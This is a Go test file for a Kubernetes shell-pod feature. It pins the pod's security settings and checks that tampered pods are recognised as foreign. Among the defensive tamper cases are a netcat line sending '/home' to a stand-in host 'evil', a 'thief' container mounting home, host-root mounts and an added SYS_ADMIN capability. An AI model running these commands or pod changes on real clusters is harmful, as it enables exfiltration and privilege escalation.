package shell

import (
	"encoding/json"
	"strings"
	"testing"
	"time"
)

/*
 * What is pinned here is the shell pod's *shape*, because the shape is the
 * security model. Every assertion below stands for a way the feature would stop
 * being safe if somebody changed one line while tidying up: a mounted service
 * account token would give the pod a cluster identity, a writable root would
 * make it non-ephemeral, a missing deadline would make an unreachable bastion
 * mean an immortal terminal.
 */

func podSpec() (map[string]any, map[string]any, map[string]any) {
	raw, err := PodManifest(PodSpec{
		Namespace:   "kubemg-system",
		Image:       "ghcr.io/kubemg/kubemg-shell:test",
		UserID:      7,
		Username:    "ada",
		MaxLifetime: 8 * time.Hour,
		Now:         time.Date(2026, 8, 27, 9, 0, 0, 0, time.UTC),
	})
	if err != nil {
		panic(err)
	}
	var pod map[string]any
	if err := json.Unmarshal(raw, &pod); err != nil {
		panic(err)
	}
	spec := pod["spec"].(map[string]any)
	container := spec["containers"].([]any)[0].(map[string]any)
	return pod, spec, container
}

// The pod holds no cluster credential. This is the feature's central rule: a
// shell's whole reach comes from the kubeconfig KubeMG writes into it, which
// carries the *operator's* identity through the proxy.
func TestPodMountsNoServiceAccountToken(t *testing.T) {
	_, spec, _ := podSpec()

	if spec["automountServiceAccountToken"] != false {
		t.Fatalf("automountServiceAccountToken = %v, want false — a shell with a cluster identity is a way around the tunnel",
			spec["automountServiceAccountToken"])
	}
	if spec["serviceAccountName"] != ServiceAccount {
		t.Fatalf("serviceAccountName = %v, want the shell's own account", spec["serviceAccountName"])
	}
	// enableServiceLinks would hand the pod the address of every Service in the
	// namespace as environment variables, which is reconnaissance the shell has
	// no reason to be given for free.
	if spec["enableServiceLinks"] != false {
		t.Fatalf("enableServiceLinks = %v, want false", spec["enableServiceLinks"])
	}
}

func TestPodCannotEscalatePrivilege(t *testing.T) {
	_, spec, container := podSpec()

	security := container["securityContext"].(map[string]any)
	if security["allowPrivilegeEscalation"] != false {
		t.Fatalf("allowPrivilegeEscalation = %v, want false", security["allowPrivilegeEscalation"])
	}
	if security["privileged"] != false {
		t.Fatalf("privileged = %v, want false", security["privileged"])
	}
	if security["runAsNonRoot"] != true {
		t.Fatalf("runAsNonRoot = %v, want true", security["runAsNonRoot"])
	}
	if security["readOnlyRootFilesystem"] != true {
		t.Fatalf("readOnlyRootFilesystem = %v, want true", security["readOnlyRootFilesystem"])
	}
	dropped := security["capabilities"].(map[string]any)["drop"].([]any)
	if len(dropped) != 1 || dropped[0] != "ALL" {
		t.Fatalf("capabilities.drop = %v, want [ALL]", dropped)
	}

	podSecurity := spec["securityContext"].(map[string]any)
	if podSecurity["runAsNonRoot"] != true {
		t.Fatalf("pod runAsNonRoot = %v, want true", podSecurity["runAsNonRoot"])
	}
	if profile := podSecurity["seccompProfile"].(map[string]any); profile["type"] != "RuntimeDefault" {
		t.Fatalf("seccompProfile = %v, want RuntimeDefault", profile)
	}
}

// Ephemeral means the storage dies with the pod. The only writable paths are two
// bounded emptyDirs — no hostPath, no PVC, nothing that outlives the session.
func TestPodIsEphemeralAndMountsNoHostPath(t *testing.T) {
	_, spec, container := podSpec()

	volumes := spec["volumes"].([]any)
	if len(volumes) != 2 {
		t.Fatalf("volumes = %v, want exactly the two scratch mounts", volumes)
	}
	for _, entry := range volumes {
		volume := entry.(map[string]any)
		empty, ok := volume["emptyDir"].(map[string]any)
		if !ok {
			t.Fatalf("volume %v is not an emptyDir; a shell must not keep anything", volume)
		}
		if empty["sizeLimit"] == nil {
			t.Fatalf("volume %v has no size limit", volume)
		}
		if _, hostPath := volume["hostPath"]; hostPath {
			t.Fatalf("volume %v mounts the host", volume)
		}
	}

	mounts := container["volumeMounts"].([]any)
	if len(mounts) != 2 {
		t.Fatalf("volumeMounts = %v, want the two scratch mounts", mounts)
	}
	if _, hostNetwork := spec["hostNetwork"]; hostNetwork {
		t.Fatal("a shell must not join the host network")
	}
	if _, hostPID := spec["hostPID"]; hostPID {
		t.Fatal("a shell must not join the host PID namespace")
	}
}

// The absolute deadline is written into the cluster rather than only enforced by
// the reaper, so a bastion that is down is not what stands between a forgotten
// shell and the end of it.
func TestPodCarriesItsOwnDeadline(t *testing.T) {
	pod, spec, _ := podSpec()

	if spec["activeDeadlineSeconds"] != float64(8*3600) {
		t.Fatalf("activeDeadlineSeconds = %v, want the max lifetime in seconds",
			spec["activeDeadlineSeconds"])
	}
	if spec["restartPolicy"] != "Never" {
		t.Fatalf("restartPolicy = %v, want Never — a crash loop must not silently produce a fresh terminal",
			spec["restartPolicy"])
	}

	annotations := pod["metadata"].(map[string]any)["annotations"].(map[string]any)
	if annotations[AnnotationExpiresAt] != "2026-08-27T17:00:00Z" {
		t.Fatalf("expiry annotation = %v, want the deadline as an instant", annotations[AnnotationExpiresAt])
	}
	if annotations[AnnotationLastActivity] != "2026-08-27T09:00:00Z" {
		t.Fatalf("activity annotation = %v, want the clock started at creation",
			annotations[AnnotationLastActivity])
	}
	if annotations[AnnotationUsername] != "ada" {
		t.Fatalf("username annotation = %v", annotations[AnnotationUsername])
	}
}

// A lifetime nobody set still has to be one the pod enforces: a zero deadline
// would be "no deadline" to the API server, which is the one value this must
// never send.
func TestPodDeadlineFallsBackRatherThanBeingUnset(t *testing.T) {
	raw, err := PodManifest(PodSpec{Namespace: "kubemg-system", UserID: 1, Now: time.Now()})
	if err != nil {
		t.Fatalf("PodManifest: %v", err)
	}
	var pod map[string]any
	if err := json.Unmarshal(raw, &pod); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	spec := pod["spec"].(map[string]any)
	if spec["activeDeadlineSeconds"] != float64(DefaultMaxLifetime/time.Second) {
		t.Fatalf("activeDeadlineSeconds = %v, want the default lifetime", spec["activeDeadlineSeconds"])
	}
}

func TestPodNameIsDerivedFromTheUser(t *testing.T) {
	if got := PodName(42); got != "kubemg-shell-42" {
		t.Fatalf("PodName = %q", got)
	}
	// Two replicas answering two requests have to arrive at the same name with
	// nothing shared between them, or a second tab makes a second shell.
	if PodName(42) != PodName(42) {
		t.Fatal("PodName is not deterministic")
	}
}

// The credential travels on stdin. The command must therefore carry no part of
// it, and must end on its own — an exec that waits for an EOF the v4 protocol
// cannot send would be a file that is never written.
func TestSeedCommandReadsAnExactCountAndCarriesNoSecret(t *testing.T) {
	argv := SeedCommand(4096)
	joined := strings.Join(argv, " ")

	if !strings.Contains(joined, "head -c 4096") {
		t.Fatalf("seed command = %q, want a bounded read rather than one waiting for EOF", joined)
	}
	if !strings.Contains(joined, KubeconfigPath) {
		t.Fatalf("seed command = %q, want it to write the kubeconfig path", joined)
	}
	if !strings.Contains(joined, "chmod 600") {
		t.Fatalf("seed command = %q, want the credential left unreadable to others", joined)
	}
}

func TestReadStatusReadsThePodsOwnAccountOfItself(t *testing.T) {
	status := ReadStatus(map[string]any{
		"metadata": map[string]any{
			"name":              "kubemg-shell-7",
			"creationTimestamp": "2026-08-27T09:00:00Z",
			"annotations": map[string]any{
				AnnotationLastActivity:      "2026-08-27T09:30:00Z",
				AnnotationExpiresAt:         "2026-08-27T17:00:00Z",
				AnnotationCredentialExpires: "2026-08-27T17:00:00Z",
			},
		},
		"spec": map[string]any{
			"containers": []any{map[string]any{"name": "shell", "image": "ghcr.io/kubemg/kubemg-shell:test"}},
		},
		"status": map[string]any{
			"phase":             "Running",
			"containerStatuses": []any{map[string]any{"ready": true}},
		},
	})

	if !status.Exists || !status.Ready || status.Phase != "Running" {
		t.Fatalf("status = %+v, want a ready running pod", status)
	}
	if status.Image != "ghcr.io/kubemg/kubemg-shell:test" {
		t.Fatalf("image = %q", status.Image)
	}
	if !status.LastActivity.Equal(time.Date(2026, 8, 27, 9, 30, 0, 0, time.UTC)) {
		t.Fatalf("last activity = %v", status.LastActivity)
	}
	if status.CredentialExpiresAt.IsZero() {
		t.Fatal("credential expiry was not read, so a second start would mint a second credential")
	}
	if status.CredentialID != 0 {
		t.Fatalf("credential id = %d, want zero when the pod carries no register row", status.CredentialID)
	}
}

// The register row the shell's kubeconfig was written as travels on the pod, so
// ending the shell can withdraw it. A pod that never carried one reads as zero
// rather than as row 0, which is a row somebody else could own.
func TestReadStatusCarriesTheCredentialRow(t *testing.T) {
	for annotation, want := range map[string]uint{
		"41":        41,
		"":          0,
		"not-an-id": 0,
		"-1":        0,
	} {
		status := ReadStatus(map[string]any{
			"metadata": map[string]any{
				"name":        "kubemg-shell-7",
				"annotations": map[string]any{AnnotationCredentialID: annotation},
			},
		})
		if status.CredentialID != want {
			t.Fatalf("credential id for %q = %d, want %d", annotation, status.CredentialID, want)
		}
	}
}

// A pod in Running whose container is still pulling is not a terminal, and the
// waiting reason is the only thing that tells an operator to stop waiting.
func TestReadStatusReportsWhyAContainerIsNotUp(t *testing.T) {
	status := ReadStatus(map[string]any{
		"metadata": map[string]any{"name": "kubemg-shell-7"},
		"status": map[string]any{
			"phase": "Pending",
			"containerStatuses": []any{map[string]any{
				"ready": false,
				"state": map[string]any{
					"waiting": map[string]any{
						"reason":  "ImagePullBackOff",
						"message": "no such image",
					},
				},
			}},
		},
	})

	if status.Ready {
		t.Fatal("a container that is waiting is not ready")
	}
	if !strings.Contains(status.Message, "ImagePullBackOff") {
		t.Fatalf("message = %q, want the cluster's own reason", status.Message)
	}
}

// A pod with no activity annotation falls back to its creation time rather than
// reading as infinitely old — the difference is a shell deleted the moment it
// starts.
func TestIdleFallsBackToCreationRatherThanReapingImmediately(t *testing.T) {
	created := time.Date(2026, 8, 27, 9, 0, 0, 0, time.UTC)
	status := ReadStatus(map[string]any{
		"metadata": map[string]any{"name": "kubemg-shell-7", "creationTimestamp": created.Format(time.RFC3339)},
		"status":   map[string]any{"phase": "Running"},
	})

	if status.Idle(created.Add(30*time.Minute), time.Hour) {
		t.Fatal("a shell created half an hour ago is not idle for an hour")
	}
	if !status.Idle(created.Add(2*time.Hour), time.Hour) {
		t.Fatal("a shell nobody has touched for two hours is idle")
	}
}

// A finished pod is always collectable: there is no terminal there any more,
// only the record of one.
func TestIdleAlwaysCollectsAFinishedPod(t *testing.T) {
	for _, phase := range []string{"Succeeded", "Failed"} {
		status := Status{Exists: true, Phase: phase, LastActivity: time.Now().UTC()}
		if !status.Idle(time.Now().UTC(), time.Hour) {
			t.Fatalf("a %s pod must be collectable however recent its activity", phase)
		}
	}
}

// A pod with no clock at all is left alone: that only arises if somebody edited
// the annotations by hand, and deleting somebody's session on an ambiguity is
// the worse half of it.
func TestIdleLeavesAPodWithNoClockAlone(t *testing.T) {
	if (Status{Exists: true, Phase: "Running"}).Idle(time.Now(), time.Hour) {
		t.Fatal("a pod with no timestamps must not be reaped")
	}
}

func TestClampsTreatAnOutOfBoundsValueAsUnset(t *testing.T) {
	if got := ClampIdleTimeout(0); got != DefaultIdleTimeout {
		t.Fatalf("ClampIdleTimeout(0) = %v, want the default", got)
	}
	if got := ClampIdleTimeout(48 * time.Hour); got != DefaultIdleTimeout {
		t.Fatalf("ClampIdleTimeout(48h) = %v, want the default rather than the nearest bound", got)
	}
	if got := ClampIdleTimeout(30 * time.Minute); got != 30*time.Minute {
		t.Fatalf("ClampIdleTimeout(30m) = %v, want it honoured", got)
	}
	if got := ClampMaxLifetime(0); got != DefaultMaxLifetime {
		t.Fatalf("ClampMaxLifetime(0) = %v, want the default", got)
	}
	if got := ClampMaxLifetime(30 * time.Minute); got != DefaultMaxLifetime {
		t.Fatalf("ClampMaxLifetime(30m) = %v, want the default", got)
	}
}

func TestActivityPatchMovesOnlyTheClock(t *testing.T) {
	var patch map[string]any
	if err := json.Unmarshal(ActivityPatch(time.Date(2026, 8, 27, 10, 0, 0, 0, time.UTC)), &patch); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	metadata := patch["metadata"].(map[string]any)
	annotations := metadata["annotations"].(map[string]any)
	if len(metadata) != 1 || len(annotations) != 1 {
		t.Fatalf("patch = %v, want it to touch one annotation and nothing else", patch)
	}
	if annotations[AnnotationLastActivity] != "2026-08-27T10:00:00Z" {
		t.Fatalf("patch = %v", patch)
	}
}

func TestSelectorFindsShellsAndNothingElse(t *testing.T) {
	selector := Selector()
	if !strings.Contains(selector, LabelComponent+"="+ComponentValue) {
		t.Fatalf("selector = %q, want it keyed on the shell component", selector)
	}
	if !strings.Contains(selector, LabelManagedBy+"=kubemg") {
		t.Fatalf("selector = %q, want it confined to objects KubeMG manages", selector)
	}
}

// The shell pod lives beside the agent and comes from the same mirror, so it
// names the agent's pull secret — and names none when none is configured.
func TestPodNamesThePullSecretOnlyWhenOneIsConfigured(t *testing.T) {
	_, spec, _ := podSpec()
	if _, found := spec["imagePullSecrets"]; found {
		t.Fatalf("imagePullSecrets = %v, want the key absent when none is configured", spec["imagePullSecrets"])
	}

	raw, err := PodManifest(PodSpec{
		Namespace:       "kubemg-system",
		Image:           "registry.corp.example/kubemg/kubemg-shell:test",
		ImagePullSecret: "mirror-pull",
		UserID:          7,
		Username:        "ada",
		MaxLifetime:     8 * time.Hour,
		Now:             time.Date(2026, 8, 27, 9, 0, 0, 0, time.UTC),
	})
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	var pod struct {
		Spec struct {
			ImagePullSecrets []map[string]string `json:"imagePullSecrets"`
		} `json:"spec"`
	}
	if err := json.Unmarshal(raw, &pod); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if got := pod.Spec.ImagePullSecrets; len(got) != 1 || got[0]["name"] != "mirror-pull" {
		t.Fatalf("imagePullSecrets = %v, want one named mirror-pull", got)
	}
}

// The pod KubeMG renders is its own; a pod under the same predictable name
// that would let something else read the seeded kubeconfig is not.
func TestReadStatusTellsAForeignPodFromItsOwn(t *testing.T) {
	render := func() map[string]any {
		raw, err := PodManifest(PodSpec{Namespace: "kubemg-system", Image: "shell:1", UserID: 7, Now: time.Now()})
		if err != nil {
			t.Fatal(err)
		}
		var pod map[string]any
		if err := json.Unmarshal(raw, &pod); err != nil {
			t.Fatal(err)
		}
		return pod
	}
	if got := ReadStatus(render()).ForeignFor("shell:1"); got != "" {
		t.Fatalf("the rendered pod read as foreign: %s", got)
	}
	if ReadStatus(render()).ForeignFor("shell:2") == "" {
		t.Fatal("a pod running another image read as KubeMG's own")
	}
	if got := (Status{}).ForeignFor("shell:1"); got != "" {
		t.Fatalf("no pod at all read as foreign: %s", got)
	}

	// Fields the API server defaults are not compared.
	defaulted := render()
	container := defaulted["spec"].(map[string]any)["containers"].([]any)[0].(map[string]any)
	container["imagePullPolicy"] = "IfNotPresent"
	container["terminationMessagePath"] = "/dev/termination-log"
	if got := ReadStatus(defaulted).ForeignFor("shell:1"); got != "" {
		t.Fatalf("a defaulted field read as foreign: %s", got)
	}

	cases := map[string]func(spec map[string]any){
		"agent service account": func(spec map[string]any) { spec["serviceAccountName"] = "kubemg-agent" },
		"token mounted":         func(spec map[string]any) { spec["automountServiceAccountToken"] = true },
		"token not declared":    func(spec map[string]any) { delete(spec, "automountServiceAccountToken") },
		"shared processes":      func(spec map[string]any) { spec["shareProcessNamespace"] = true },
		"host pid":              func(spec map[string]any) { spec["hostPID"] = true },
		"other command": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["command"] = []any{"/bin/sh", "-c", "nc evil 1 < /home"}
		},
		"extra args": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["args"] = []any{"x"}
		},
		"reader of home": func(spec map[string]any) {
			spec["containers"] = append(spec["containers"].([]any), map[string]any{
				"name": "thief", "volumeMounts": []any{map[string]any{"name": "home", "mountPath": "/loot"}},
			})
		},
		"home on a host path": func(spec map[string]any) {
			spec["volumes"].([]any)[0] = map[string]any{"name": "home", "hostPath": map[string]any{"path": "/"}}
		},
		"no shell container": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["name"] = "other"
		},
		"ephemeral container": func(spec map[string]any) {
			spec["ephemeralContainers"] = []any{map[string]any{"name": "debug", "targetContainerName": "shell"}}
		},
		"node path elsewhere": func(spec map[string]any) {
			spec["volumes"] = append(spec["volumes"].([]any), map[string]any{
				"name": "kubelet", "hostPath": map[string]any{"path": "/var/lib/kubelet"},
			})
		},
		"extra mount in the shell": func(spec map[string]any) {
			container := spec["containers"].([]any)[0].(map[string]any)
			container["volumeMounts"] = append(container["volumeMounts"].([]any),
				map[string]any{"name": "loot", "mountPath": HomeDir + "/.kube"})
		},
		"sidecar": func(spec map[string]any) {
			spec["containers"] = append(spec["containers"].([]any), map[string]any{"name": "istio-proxy", "image": "proxy"})
		},
		"sidecar first": func(spec map[string]any) {
			spec["containers"] = append([]any{map[string]any{"name": "evil", "image": "x"}}, spec["containers"].([]any)...)
		},
		"init container": func(spec map[string]any) {
			spec["initContainers"] = []any{map[string]any{"name": "prep", "image": "x"}}
		},
		"pvc": func(spec map[string]any) {
			spec["volumes"] = append(spec["volumes"].([]any), map[string]any{
				"name": "data", "persistentVolumeClaim": map[string]any{"claimName": "x"},
			})
		},
		"PATH in the environment": func(spec map[string]any) {
			container := spec["containers"].([]any)[0].(map[string]any)
			container["env"] = append(container["env"].([]any), map[string]any{"name": "PATH", "value": "/tmp"})
		},
		"env from a secret": func(spec map[string]any) {
			container := spec["containers"].([]any)[0].(map[string]any)
			container["env"].([]any)[0] = map[string]any{"name": "HOME", "valueFrom": map[string]any{}}
		},
		"working dir": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["workingDir"] = "/tmp"
		},
		"lifecycle hook": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["lifecycle"] = map[string]any{"postStart": map[string]any{}}
		},
		"privileged": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["securityContext"].(map[string]any)["privileged"] = true
		},
		"added capability": func(spec map[string]any) {
			spec["containers"].([]any)[0].(map[string]any)["securityContext"].(map[string]any)["capabilities"] =
				map[string]any{"add": []any{"SYS_ADMIN"}}
		},
		"home mounted elsewhere": func(spec map[string]any) {
			container := spec["containers"].([]any)[0].(map[string]any)
			container["volumeMounts"].([]any)[0] = map[string]any{"name": "home", "mountPath": "/elsewhere"}
		},
	}
	for name, mutate := range cases {
		pod := render()
		mutate(pod["spec"].(map[string]any))
		if ReadStatus(pod).Foreign == "" {
			t.Errorf("%s: read as KubeMG's own pod", name)
		}
	}
}
